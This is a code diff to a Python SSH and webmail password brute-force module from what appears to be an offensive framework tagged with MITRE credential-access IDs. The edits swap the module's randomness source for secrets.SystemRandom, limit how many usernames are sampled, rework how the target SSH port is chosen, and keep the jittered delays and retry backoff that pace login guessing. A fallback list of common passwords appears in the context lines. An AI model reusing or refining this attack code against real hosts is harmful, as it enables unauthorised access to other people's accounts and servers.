@@ -20,7 +20,7 @@ SUPPORTS:
 import asyncio
 import asyncssh
 import aiohttp
-import random
+import secrets
 import logging
 import re
 import ssl
@@ -55,7 +55,7 @@ _FALLBACK_PASSWORDS = ["password", "123456", "admin", "root"]
 class SSHBruteForceModule(BaseAttackModule):
 
     MODULE_NAME = "ssh_bruteforce"
-    DESCRIPTION = "Adaptive credential brute force (SSH + Webmail/Roundcube)"
+    DESCRIPTION = "Adaptive credential brute force (SSH + Webmail)"
     MITRE_TACTIC = "Credential Access"
     MITRE_IDS = ["T1110", "T1110.001"]
 
@@ -177,9 +177,7 @@ class SSHBruteForceModule(BaseAttackModule):
             or resolved.ip
             or resolved.original
         )
-        port = 22
-        if parsed.scheme not in ["http", "https"]:
-            port = int(resolved.port or self.options.get("ssh_port", 22))
+        port = int(self.options.get("ssh_port", resolved.port or 22))
 
         timeout        = float(self.options.get("timeout",        5.0))
         concurrency    = int(self.options.get("concurrency",      5))
@@ -197,11 +195,11 @@ class SSHBruteForceModule(BaseAttackModule):
         )
 
         if len(usernames) > 1:
-            usernames = usernames[:1] + random.sample(
-                usernames[1:], len(usernames[1:])
+            usernames = usernames[:1] + secrets.SystemRandom().sample(
+                usernames[1:], min(4, len(usernames) - 1)
             )
         if len(passwords) > 5:
-            passwords = passwords[:5] + random.sample(
+            passwords = passwords[:5] + secrets.SystemRandom().sample(
                 passwords[5:], len(passwords[5:])
             )
 
@@ -695,7 +693,7 @@ class SSHBruteForceModule(BaseAttackModule):
                     except asyncio.TimeoutError:
                         self.timeout_count += 1
                         if attempt < max_retries:
-                            wait_s = backoff_timeout + random.uniform(0, jitter)
+                            wait_s = backoff_timeout + secrets.SystemRandom().uniform(0, jitter)
                             await self.emit_event('INFO', 
                                 f"[TIMEOUT] {username}:{password} "
                                 f"— retry {attempt + 1}/{max_retries} after {wait_s:.1f}s"
@@ -754,7 +752,7 @@ class SSHBruteForceModule(BaseAttackModule):
                         )
 
                     # Inter-attempt delay with jitter
-                    sleep_s = attempt_delay + random.uniform(0, jitter)
+                    sleep_s = attempt_delay + secrets.SystemRandom().uniform(0, jitter)
                     await asyncio.sleep(sleep_s)
                     return
 
